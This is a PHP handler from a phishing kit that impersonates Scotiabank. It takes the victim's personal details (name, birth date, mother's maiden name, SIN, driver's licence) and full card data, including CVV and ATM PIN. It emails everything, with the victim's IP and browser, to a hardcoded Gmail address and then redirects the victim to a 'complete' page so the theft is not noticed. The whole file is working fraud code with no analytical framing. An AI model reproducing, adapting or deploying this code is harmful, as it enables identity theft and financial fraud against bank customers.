<?
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------3 PersonalDetails----------------\n";
$message .= "FULLNAME	: ".$_POST['FN']."\n";
$message .= "DOB		: ".$_POST['DB']."\n";
$message .= "MMN		: ".$_POST['MN']."\n";
$message .= "SIN		: ".$_POST['SN']."\n";
$message .= "DLN		: ".$_POST['DN']."\n";
$message .= "-----------------3 CardDetails--------------------\n";
$message .= "NAMEONCARD	: ".$_POST['NC']."\n";
$message .= "CARDNO		: ".$_POST['CN']."\n";
$message .= "EXP		: ".$_POST['ED']."\n";
$message .= "CVV		: ".$_POST['CV']."\n";
$message .= "ATMPIN		: ".$_POST['AP']."\n";
$message .= "-----------------created by 723806851---------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "-----------------SCOTIARESULTS--------------------\n";
$send = "marcusfield20@gmail.com";
$subject = "scotiaResultz 2 ".$_POST['results'];
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message);
}
?>
<script>

    window.top.location.href = "complete.html";
</script>